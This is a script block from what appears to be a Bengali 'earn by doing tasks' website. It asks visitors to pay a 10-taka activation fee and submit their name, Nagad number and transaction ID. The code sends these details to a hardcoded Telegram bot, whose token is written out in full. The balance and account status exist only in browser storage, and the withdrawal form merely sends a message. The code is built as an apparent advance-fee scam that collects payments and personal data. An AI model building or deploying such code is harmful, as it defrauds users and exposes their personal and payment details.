<script>
        const BOT_TOKEN = '8726008499:AAFIajdSOavCs8lB8Yh2IlODwEqsmyr9-2c';
        const CHAT_ID = '6733473116';

        // লোকাল স্টোরেজ থেকে ডাটা লোড করা (যাতে রিফ্রেশ করলে মুছে না যায়)
        let isAccountActive = localStorage.getItem('hi_account_active') === 'true';
        let userBalance = parseFloat(localStorage.getItem('hi_user_balance')) || 15.00;

        window.addEventListener('DOMContentLoaded', () => {
            // সেভ করা নাম ও ফোন নম্বর ডিসপ্লে করা
            const savedName = localStorage.getItem('hi_user_name');
            if (savedName) {
                document.getElementById('userNameDisplay').innerText = savedName.toUpperCase();
                document.getElementById('profileNameDisplay').innerText = savedName.toUpperCase();
            }

            if (isAccountActive) {
                document.getElementById('statusText').innerText = 'Active';
                document.getElementById('badgeStatus').className = "bg-green-500/80 text-[10px] px-2 py-0.5 rounded-full font-bold flex items-center gap-1 w-fit mt-1";
                document.getElementById('profileStatusBadge').className = "bg-green-100 text-green-600 text-[10px] px-3 py-1 rounded-full font-bold inline-block mt-1";
                document.getElementById('profileStatusBadge').innerText = "Active User";
                document.getElementById('inactiveAlertCard').style.display = 'none';
            }

            updateBalanceUI();
        });

        function updateBalanceUI() {
            document.getElementById('mainBalanceDisplay').innerText = '৳' + userBalance.toFixed(2);
            document.getElementById('modalBalanceDisplay').innerText = '৳' + userBalance.toFixed(2);
            localStorage.setItem('hi_user_balance', userBalance);
        }

        function checkTaskAccess(taskName) {
            if (!isAccountActive) {
                alert('⚠️ আপনার অ্যাকাউন্টটি ইনঅ্যাক্টিভ! কাজ করতে ১০ টাকা দিয়ে আগে অ্যাকাউন্টটি একটিভ করুন।');
                openActivationModal();
                return;
            }
            alert(taskName + ' সেকশনে আপনাকে স্বাগতম!');
        }

        function openActivationModal() {
            document.getElementById('activationModal').classList.remove('hidden');
        }

        function openWalletModal() {
            document.getElementById('walletModal').classList.remove('hidden');
        }

        function openProfileModal() {
            document.getElementById('profileModal').classList.remove('hidden');
        }

        function closeModal(id) {
            document.getElementById(id).classList.add('hidden');
        }

        function copyReferLink() {
            if (!isAccountActive) {
                alert('⚠️ অ্যাকাউন্ট একটিভ ছাড়া আপনি রেফার লিঙ্ক শেয়ার করতে পারবেন না!');
                openActivationModal();
                return;
            }
            const copyText = document.getElementById("referLinkInput");
            copyText.select();
            copyText.setSelectionRange(0, 99999);
            navigator.clipboard.writeText(copyText.value);
            alert("আপনার রেফারেল লিঙ্ক কপি হয়েছে: \n" + copyText.value);
        }

        function handleActivationSubmit(event) {
            event.preventDefault();

            const name = document.getElementById('senderName').value;
            const phone = document.getElementById('senderPhone').value;
            const trxid = document.getElementById('senderTrxid').value;
            const submitBtn = document.getElementById('submitBtn');

            submitBtn.innerText = 'জমা হচ্ছে...';
            submitBtn.disabled = true;

            const message = `🔔 *নতুন একটিভেশন রিকোয়েস্ট!* %0A%0A👤 *নাম:* ${name}%0A📱 *নগদ নম্বর:* ${phone}%0A🆔 *TrxID:* ${trxid}%0A⏰ *সময়:* ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}`;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        if(name) {
                            document.getElementById('userNameDisplay').innerText = name.toUpperCase();
                            document.getElementById('profileNameDisplay').innerText = name.toUpperCase();
                            localStorage.setItem('hi_user_name', name);
                        }
                        
                        isAccountActive = true;
                        localStorage.setItem('hi_account_active', 'true');

                        document.getElementById('statusText').innerText = 'Active';
                        document.getElementById('badgeStatus').className = "bg-green-500/80 text-[10px] px-2 py-0.5 rounded-full font-bold flex items-center gap-1 w-fit mt-1";
                        document.getElementById('profileStatusBadge').className = "bg-green-100 text-green-600 text-[10px] px-3 py-1 rounded-full font-bold inline-block mt-1";
                        document.getElementById('profileStatusBadge').innerText = "Active User";
                        document.getElementById('inactiveAlertCard').style.display = 'none';

                        alert('আপনার তথ্য সফলভাবে জমা হয়েছে! অ্যাকাউন্ট সফলভাবে একটিভ করা হয়েছে।');
                        closeModal('activationModal');
                    } else {
                        alert('তথ্য পাঠাতে সমস্যা হয়েছে, আবার চেষ্টা করুন।');
                    }
                })
                .catch(error => {
                    alert('নেটওয়ার্ক সমস্যা! আবার চেষ্টা করুন।');
                })
                .finally(() => {
                    submitBtn.innerText = 'তথ্য জমা দিন';
                    submitBtn.disabled = false;
                });
        }

        function handleWithdrawSubmit(event) {
            event.preventDefault();
            
            if (!isAccountActive) {
                alert('⚠️ অ্যাকাউন্ট একটিভ ছাড়া উইথড্র করা যাবে না!');
                openActivationModal();
                return;
            }

            const method = document.getElementById('withdrawMethod').value;
            const phone = document.getElementById('withdrawPhone').value;
            const amount = parseFloat(document.getElementById('withdrawAmount').value);
            const withdrawBtn = document.getElementById('withdrawBtn');

            if (isNaN(amount) || amount < 100) {
                alert('❌ সর্বনিম্ন ১০০ টাকা বা তার বেশি হলে তবেই উইথড্র করতে পারবেন!');
                return;
            }

            if (amount > userBalance) {
                alert('❌ আপনার অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই!');
                return;
            }

            withdrawBtn.innerText = 'পাঠানো হচ্ছে...';
            withdrawBtn.disabled = true;

            const message = `💸 *নতুন উইথড্র রিকোয়েস্ট!* %0A%0A📱 *মেথড:* ${method}%0A📞 *নম্বর:* ${phone}%0A💰 *পরিমাণ:* ${amount} টাকা%0A⏰ *সময়:* ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}`;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        userBalance -= amount;
                        updateBalanceUI();

                        alert('আপনার উইথড্র রিকোয়েস্ট সফলভাবে জমা হয়েছে! শীঘ্রই পেমেন্ট দেওয়া হবে।');
                        closeModal('walletModal');
                    } else {
                        alert('উইথড্র রিকোয়েস্ট পাঠাতে সমস্যা হয়েছে।');
                    }
                })
                .catch(error => {
                    alert('নেটওয়ার্ক সমস্যা! আবার চেষ্টা করুন।');
                })
                .finally(() => {
                    withdrawBtn.innerText = 'উইথড্র রিকোয়েস্ট পাঠান';
                    withdrawBtn.disabled = false;
                });
        }
    </script>
